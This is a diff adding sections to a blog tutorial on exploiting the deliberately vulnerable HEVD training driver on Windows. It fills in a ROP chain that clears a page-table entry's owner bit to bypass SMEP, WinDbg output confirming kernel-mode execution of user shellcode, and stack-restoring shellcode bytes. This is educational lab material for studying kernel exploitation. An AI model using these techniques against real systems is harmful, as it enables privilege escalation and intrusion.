@@ -461,12 +461,97 @@ mov r10, rax                               ; save returned value for later
 mov rcx, qword [rax]                       ; move the value in the PTE to rcx
 sub rcx, 0x4                               ; zero the 3rd bit
 mov qword [r10], rcx                       ; save the new value back to the PTE address
+wbinvd                                     ; flush the processor cache
 ```
 
-todo
+The problem is the gadgets we require aren't always available. I came up with the following pretty quickly but you may be able to find something better:
+
+```c
+*(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
+*(rop + index++) = (QWORD)alloc;
+*(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress
+
+*(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
+                                                // add rsp, 0x28; ret;
+// junk
+for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
+                                                // rax = r8 = Shellcode's PTE address
+
+*(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
+                                                // add rsp, 0x28; ret;
+// junk
+for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
+                                                // rax = r10 = Shellcode's PTE address
+
+*(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
+                                                // rax = Shellcode's PTE value
+
+*(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
+                                                // add rsp, 0x28; ret;
+// junk
+for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
+                                                // rax = r8 = Shellcode's PTE value
+
+*(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
+                                                // r8 = rcx = rax = Shellcode's PTE value
+
+*(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
+*(rop + index++) = (QWORD)0x4;
+*(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
+                                                // rcx = rax = modified PTE value
+
+*(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
+                                                // moves the modified PTE value to the PTE address
+
+*(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;
+
+// ret to user space shellcode
+*(rop + index++) = (QWORD)alloc;
+```
+
+If we plug this in to our exploit we should be able to get code execution in user space.
 
 ## User Mode Code Execution Take 2
 
-todo
+Now when we run our exploit on the target we should hit the breakpoint in our user space shellcode:
+
+```
+1: kd> g
+Break instruction exception - code 80000003 (first chance)
+00000295`cf8b0000 cc              int     3
+```
+
+We can look at `r10`, in our ROP chain this was set to point at the **PTE** address of our allocated virtual memory:
+
+```
+1: kd> r r10
+r10=ffffde814ae7c580
+1: kd> dt _MMPTE_HARDWARE ffffde814ae7c580
+nt!_MMPTE_HARDWARE
+   +0x000 Valid            : 0y1
+   +0x000 Dirty1           : 0y1
+   +0x000 Owner            : 0y0
+   ...
+```
+
+We can see here that the user space page is owned by the Kernel! We now have control of `rip` and can execute our own shellcode.
+
+Remember earlier we examined the registers and observed that `r11` contained the value in `rsp`? Provided we haven't changed the value in `r11` (and we haven't) we can restore the stack and return execution back to the driver:
+
+```c
+char shellcode[] = {
+  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x4c, 0x89, 0xdc,    // mov    rsp,r11
+  0xc3                 // ret
+};
+```
+
+I have changed the shellcode to execute 8 nops then restore the stack and return to the driver. We can compile the exploit, copy it to the target and execute it:
+
+<img width="921" alt="Screenshot 2024-08-26 at 18 57 46" src="https://github.com/user-attachments/assets/159d7e40-105a-462b-bbaf-a2e5d90d74b2">
+
+Excellent! We execute our shellcode and restore execution back within the driver when we are done. We have a stable exploit, albeit one that doesn't execute any useful shellcode yet.
+
+In the next part we will write shellcode to escalate our privileges.
 
 [Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 3](https://plackyhacker.github.io/kernel/hevd-3)
